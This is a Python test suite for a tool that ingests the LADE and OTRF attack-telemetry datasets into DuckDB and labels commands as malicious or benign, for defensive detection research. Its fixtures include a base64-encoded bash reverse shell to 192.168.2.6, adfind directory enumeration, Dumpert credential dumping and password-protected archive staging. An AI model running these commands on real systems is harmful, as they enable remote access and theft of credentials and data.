"""End-to-end checks using released LADE and OTRF command occurrences."""

import io
import json
import os
import shutil
import tarfile
import zipfile
from pathlib import Path

import duckdb
import pytest
from test_ingest_performance import ingest

HERE = Path(__file__).parent


def add_member(archive, name, data):
    """Store an authentic text or archive member in a small release fixture."""
    if isinstance(data, str):
        data = data.encode()
    member = tarfile.TarInfo(name)
    member.size = len(data)
    archive.addfile(member, io.BytesIO(data))


def zipped(name, data):
    """Package a released log using the publisher's ZIP layout."""
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as archive:
        archive.writestr(name, data)
    return stream.getvalue()


@pytest.fixture(scope="module")
def pwsh():
    """Require the real static parser so an incompatible runtime fails explicitly."""
    executable = os.environ.get("LADE_PWSH") or shutil.which("pwsh")
    if executable:
        return executable
    # The normal dataset fetch installs a versioned portable runtime on Linux.
    # These tests run after ./datasets/lade/fetch, as the README documents.
    archive = HERE / "lade" / "powershell-7.6.6-linux-x64.tar.gz"
    assert archive.exists(), "LADE's PowerShell AST tests require ./datasets/lade/fetch or LADE_PWSH"
    return None


def test_lade_authentic_groundtruth_and_processed_selection(tmp_path, pwsh):
    """GroundTruth wins over Processed; cmd redirection and PS literals survive."""
    root = tmp_path / "lade"
    root.mkdir()
    runtime = HERE / "lade" / "powershell-7.6.6-linux-x64.tar.gz"
    if runtime.exists():
        (root / runtime.name).symlink_to(runtime)
    with tarfile.open(root / "aviator-ground-truth-and-tools.tar.gz", "w:gz"):
        pass
    text = (HERE / "lade_groundtruth_fixture.txt").read_text()
    with tarfile.open(root / "lade.tar.gz", "w:gz") as archive:
        add_member(archive, "LADE/Caldera-derived/APT_labeled_sequences/GroundTruth/sequence.txt", text)
        add_member(archive, "LADE/Caldera-derived/APT_labeled_sequences/Processed/sequence.txt", text)
        # Authentic first process line of the AVIATOR APT29 source sequence.
        add_member(archive, "LADE/AVIATOR/APT_labeled_sequences/sequence.txt",
                   'WevtUtil  sl Security /ms:20000000000  /rt:true /lfn:"D:\\x\\msft_security_audit_14_03_2024_14_21_51.88_WIN-RC1R6G07IK7_x.evtx"\n')
    database = tmp_path / "lade.duckdb"
    result = ingest(root, database, "from _ingest_lade import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        rows = con.execute("SELECT pgm,args,label,group_id,shell_input,other_tokens FROM COMMANDS ORDER BY rowid").fetchall()
        assert len(rows) == 3, "LADE's matching Processed copy or Resolved Code was imported twice"
        assert rows[0][:4] == ("Test-Connection", ["-ComputerName", "192.168.1.1", "-Count", "3", "-Quiet"], "benign", None)
        assert rows[1][:4] == ("adfind.exe", ["-f", "(objectcategory=person)"], "malicious", None)
        assert rows[1][4:] == ('"adfind.exe" -f (objectcategory=person) > ad_users.txt', [">", "ad_users.txt"])
        assert rows[2][4:] == (None, []), "Process telemetry must not become submitted shell input"
    again = ingest(root, database, "from _ingest_lade import records\n")
    assert again.returncode == 0, again.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute("SELECT count(*) FROM COMMANDS").fetchone()[0] == 3


def test_otrf_authentic_dumpert_sources_merge(tmp_path):
    """The released 4688 and Sysmon records describe one Dumpert execution."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    data = (HERE / "otrf_dumpert_fixture.jsonl").read_text()
    release = [json.loads(line) for line in data.splitlines()]
    assert {row["EventID"] for row in release} == {1, 4688}
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/atomic/_metadata/dumpert.yaml", """id: SDWIN-201018105614
platform: [Windows]
attack_mappings: [{technique: T1003}]
files:
  - type: Host
    link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/dumpert.zip
""")
        add_member(archive, "OTRF/datasets/atomic/windows/credential_access/host/dumpert.zip", zipped("dumpert.json", data))
    database = tmp_path / "otrf.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        rows = con.execute("SELECT pgm,args,label,group_id,shell_input,other_tokens FROM COMMANDS").fetchall()
        assert rows == [(r"C:\Users\wardog\Desktop\Outflank-Dumpert.exe", [], "malicious", None, None, [])], \
            "OTRF's two providers must merge by host, PID, image and execution time"
    again = ingest(root, database, "from _ingest_otrf import records\n")
    assert again.returncode == 0, again.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute("SELECT count(*) FROM COMMANDS").fetchone()[0] == 1


def test_otrf_reused_pid_distinct_capture_and_time(tmp_path):
    """PID reuse and repeated executions remain separate from alternate exports."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    events = [json.loads(line) for line in (HERE / "otrf_dumpert_fixture.jsonl").read_text().splitlines()]
    later = dict(events[0], TimeCreated="2020-10-18 10:57:14.283")
    data = "\n".join(json.dumps(e) for e in [*events, later])
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/atomic/windows/host/first.zip", zipped("events.json", data))
        add_member(archive, "OTRF/datasets/atomic/windows/host/second.zip", zipped("events.json", data))
    database = tmp_path / "otrf.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute("SELECT count(*) FROM COMMANDS").fetchone()[0] == 4


def test_otrf_azure_failed_exec_and_truncated_sysmon(tmp_path):
    """Authentic Azure records preserve attempted images and complete XML fields."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    data = (HERE / "otrf_azure_fixture.jsonl").read_bytes()
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/compound/Log4Shell/events.zip", zipped("events.json", data))
    database = tmp_path / "azure.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        rows = con.execute("SELECT pgm,args,os,shell_input,group_id FROM COMMANDS ORDER BY rowid").fetchall()
        assert rows == [
            ("/usr/local/sbin/bash", [], "linux", None, None),
            ("/bin/bash", ["-c", "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}"], "linux", None, None),
        ], "AUOMS must retain failed attempts, preserve quoting and merge the matching Sysmon launch"


def test_lade_static_script_invocations_and_scenario_labels(tmp_path, pwsh):
    """PowerShell parses real commands without executing them or inventing string commands."""
    root = tmp_path / "lade"
    root.mkdir()
    runtime = HERE / "lade" / "powershell-7.6.6-linux-x64.tar.gz"
    if runtime.exists():
        (root / runtime.name).symlink_to(runtime)
    with tarfile.open(root / "aviator-ground-truth-and-tools.tar.gz", "w:gz") as archive:
        add_member(archive, "aviator/ground_truth/apt29/scenario1.sh", "# scenario start\nInvoke-Persistence -PersistStep 1\n# scenario end\n")
    marker = tmp_path / "must-not-be-created"
    script = f'"data string"; Set-Content -Path "{marker}" -Value "do not execute"\n'
    code = '& "C:\\Program Files\\7-Zip\\7z.exe" a "C:\\StagedFiles.7z" "C:\\StagedFiles\\*" "-pSecurePass123" | Out-Null\nsleep 1; ls C:\\StagedFiles.7z | foreach {$_.FullName} | select'
    ground = f"[ Code-snippet ]:\n{code}\n\n[ Resolved Code ]:\nWrite-Host 'not another execution'\n\n[ GROUND-TRUTH & ALL INFORMATION ]:\n- GROUND-TRUTH: T1560.001: Archive Collected Data\n- PLATFORM: platforms.windows.psh.command\n---------------------------------------------------\n"
    with tarfile.open(root / "lade.tar.gz", "w:gz") as archive:
        add_member(archive, "LADE/Caldera-derived/APT_labeled_sequences/GroundTruth/archive.txt", ground)
        add_member(archive, "LADE/Caldera-derived/Benign_labeled_sequences/example.txt", script)
        add_member(archive, "LADE/AVIATOR/APT_labeled_sequences/Processed_APT29__scenario1.txt", 'Invoke-Persistence -PersistStep 1\n\n"C:\\Program Files\\Mozilla Firefox\\firefox.exe"\n')
    database = tmp_path / "scripts.duckdb"
    result = ingest(root, database, "from _ingest_lade import records\n")
    assert result.returncode == 0, result.stderr
    assert not marker.exists(), "The PowerShell parser executed dataset text"
    with duckdb.connect(str(database)) as con:
        rows = con.execute("SELECT pgm,args,label,group_id FROM COMMANDS ORDER BY rowid").fetchall()
        assert [row[0] for row in rows] == [r"C:\Program Files\7-Zip\7z.exe", "Out-Null", "sleep", "ls", "foreach", "select", "Set-Content", "Invoke-Persistence", r"C:\Program Files\Mozilla Firefox\firefox.exe"]
        assert rows[0][1] == ["a", r"C:\StagedFiles.7z", "C:\\StagedFiles\\*", "-pSecurePass123"]
        assert rows[1][2] == rows[2][2] == rows[-1][2] == "benign"
        assert rows[-2][2:] == ("malicious", None)


def test_otrf_metadata_and_host_scoped_process_ancestry(tmp_path):
    """Transcript attribution reaches descendants but respects ordinary launches and PID reuse."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    base = {"EventID": 1, "SourceName": "Microsoft-Windows-Sysmon", "Hostname": "host1"}
    launches = [
        dict(base, ProcessId="10", ProcessGuid="attack", Image="Seatbelt.exe", CommandLine="Seatbelt.exe -group=user", TimeCreated="2020-10-18 10:56:14.000"),
        dict(base, ProcessId="11", ProcessGuid="child", ParentProcessGuid="attack", Image="cmd.exe", CommandLine="cmd.exe /c whoami", TimeCreated="2020-10-18 10:56:15.000"),
        dict(base, ProcessId="12", ParentProcessGuid="attack", Image="chrome.exe", CommandLine="chrome.exe --type=renderer", TimeCreated="2020-10-18 10:56:16.000"),
        dict(base, ProcessId="10", ProcessGuid="reused", Image="normal.exe", CommandLine="normal.exe", TimeCreated="2020-10-18 10:57:14.000"),
        dict(base, ProcessId="13", ParentProcessId="10", Image="cmd.exe", CommandLine="cmd.exe /c whoami", TimeCreated="2020-10-18 10:57:15.000"),
        dict(base, Hostname="host2", ProcessId="14", ParentProcessGuid="attack", Image="cmd.exe", CommandLine="cmd.exe /c whoami", TimeCreated="2020-10-18 10:57:15.000"),
        dict(base, ProcessId="bad", Image=r"C:\Windows\notepad.exe", TimeCreated="unavailable"),
        dict(base, ProcessId="15", ParentProcessGuid="attack", Image="chrome.exe", CommandLine="chrome.exe --type=renderer --renderer-cmd-prefix=evil", TimeCreated="2020-10-18 10:57:16.000"),
    ]
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/atomic/_metadata/seatbelt.yaml", """id: SDWIN-201102163918
platform: [Windows]
attack_mappings: [{technique: T1012}]
simulation:
  adversary_view: 'C:\\Users\\wardog\\Desktop>Seatbelt.exe -group=user'
files:
  - type: Host
    link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/host/seatbelt.zip
""")
        add_member(archive, "OTRF/datasets/atomic/windows/host/seatbelt.zip", zipped("events.json", "\n".join(json.dumps(e) for e in launches)))
    database = tmp_path / "ancestry.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute("SELECT label FROM COMMANDS ORDER BY rowid").fetchall() == [
            ("malicious",), ("malicious",), ("benign",), ("malicious-group",),
            ("malicious-group",), ("malicious-group",), ("benign",), ("malicious",),
        ]
        assert con.execute("SELECT args FROM COMMANDS WHERE pgm LIKE '%notepad.exe'").fetchone() == ([],)


def test_otrf_linux_audit_exec_filter_and_sessions(tmp_path):
    """Real audit launch fields survive; non-exec observations and parent-PID sessions do not."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    data = (HERE / "otrf_audit_fixture.log").read_text()
    data += '\ntype=SYSCALL msg=audit(1604994497.155:99901): arch=c000003e syscall=0 success=yes pid=1631 ppid=29002 ses=104 exe="/usr/sbin/arp"\n'
    data += 'type=PROCTITLE msg=audit(1604994497.155:99901): proctitle=617270002D61\n'
    data += 'type=EOE msg=audit(1604994497.155:99901):\n'
    data += 'type=SYSCALL msg=audit(1604994498.155:99902): arch=c000003e syscall=59 success=no pid=1631 ppid=29002 ses=4294967295 exe="/bin/bash"\n'
    data += 'type=PATH msg=audit(1604994498.155:99902): name="/missing/program"\n'
    data += 'type=PROCTITLE msg=audit(1604994498.155:99902): proctitle=62617368002D63\n'
    data += 'type=EOE msg=audit(1604994498.155:99902):\n'
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/atomic/linux/host/audit.zip", zipped("audit.log", data))
    database = tmp_path / "audit.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        rows = con.execute("SELECT pgm,args,session_id,group_id FROM COMMANDS ORDER BY record_id").fetchall()
        assert len(rows) == 3, "Only two authentic execs and one failed attempt should survive"
        assert rows[0][:2] == ("/usr/sbin/arp", ["-a"])
        assert rows[1][:2] == ("/bin/grep", ["-v", "^?"])
        assert rows[0][2].endswith(":104")
        assert rows[2][:2] == ("/missing/program", [])
        assert ":record:" in rows[2][2], "Missing audit session must not become a shared parent-PID session"
        assert all(row[3] is None for row in rows)


def test_otrf_raw_audit_ancestry_reuse_and_target_only_failure(tmp_path):
    """Raw audit attribution follows parent lifetimes and retains failed targets without argv."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    lines = (HERE / "otrf_audit_fixture.log").read_text().splitlines()
    first = "\n".join(lines[:6]) + "\ntype=EOE msg=audit(1604994496.155:92733):\n"
    second = "\n".join(lines[6:]).replace("ppid=29002", "ppid=1631")
    second += "\ntype=EOE msg=audit(1604994496.155:92734):\n"
    later = '''type=SYSCALL msg=audit(1604994497.155:99901): arch=c000003e syscall=59 success=yes pid=1631 ppid=29002 exe="/bin/true"
type=EXECVE msg=audit(1604994497.155:99901): argc=1 a0="true"
type=EOE msg=audit(1604994497.155:99901):
type=SYSCALL msg=audit(1604994498.155:99902): arch=c000003e syscall=59 success=yes pid=1633 ppid=1631 exe="/usr/bin/id"
type=EXECVE msg=audit(1604994498.155:99902): argc=1 a0="id"
type=EOE msg=audit(1604994498.155:99902):
type=SYSCALL msg=audit(1604994499.155:99903): arch=c000003e syscall=59 success=no pid=1633 ppid=1631 exe="/usr/bin/id"
type=PATH msg=audit(1604994499.155:99903): name="/missing/program" nametype=UNKNOWN
type=EOE msg=audit(1604994499.155:99903):
'''
    data = "\n".join("node=host " + line for line in (first + second + later).splitlines())
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/atomic/_metadata/audit.yaml", """id: audit-capture
platform: [Linux]
attack_mappings: [{technique: T1018}]
simulation:
  adversary_view: 'root@host:/tmp# arp -a'
files:
  - type: Host
    link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/host/audit.zip
""")
        add_member(archive, "OTRF/datasets/atomic/linux/host/audit.zip", zipped("audit.log", data))
    database = tmp_path / "audit-ancestry.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute("SELECT pgm,label FROM COMMANDS ORDER BY record_id").fetchall() == [
            ("/usr/sbin/arp", "malicious"), ("/bin/grep", "malicious"),
            ("/bin/true", "malicious-group"), ("/usr/bin/id", "malicious-group"),
            ("/missing/program", "malicious-group"),
        ]
        assert con.execute("SELECT args FROM COMMANDS WHERE pgm='/missing/program'").fetchone() == ([],)


def test_otrf_authentic_unprompted_dd_attack_metadata(tmp_path):
    """The published DD transcript identifies its command without labeling output as commands."""
    root = tmp_path / "otrf-security-datasets"
    root.mkdir()
    with tarfile.open(root / "security-datasets.tar.gz", "w:gz") as archive:
        add_member(archive, "OTRF/datasets/atomic/_metadata/SDLIN-201110081941.yaml", (HERE / "otrf_dd_fixture.yaml").read_bytes())
        add_member(archive, "OTRF/datasets/atomic/linux/defense_evasion/host/sh_binary_padding_dd.zip", zipped("audit.log", (HERE / "otrf_dd_fixture.log").read_bytes()))
    database = tmp_path / "dd.duckdb"
    result = ingest(root, database, "from _ingest_otrf import records\n")
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute("SELECT pgm,args,label,group_id FROM COMMANDS").fetchall() == [
            ("/bin/dd", ["if=/dev/zero", "bs=1", "count=1"], "malicious", None),
        ]
